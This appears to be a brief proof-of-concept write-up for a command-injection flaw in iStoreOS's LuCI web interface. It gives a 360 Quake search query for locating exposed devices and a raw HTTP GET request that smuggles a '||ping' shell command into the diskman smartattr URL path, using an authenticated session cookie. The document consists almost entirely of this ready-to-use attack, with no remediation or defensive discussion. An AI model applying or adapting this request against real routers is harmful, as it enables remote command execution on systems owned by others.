## 360quake
title:"IstoreOS"

## poc
需有权限才能使用此漏洞
```C
GET /cgi-bin/luci/admin/system/diskman/smartattr/%7c%7cping%20www.baidu.com HTTP/1.1
Host: IP:PORT
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,en-GB;q=0.6,en-US;q=0.5
Cookie: sysauth_http=4b524da6571cdd27dac062efd9c8be9d
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0


```
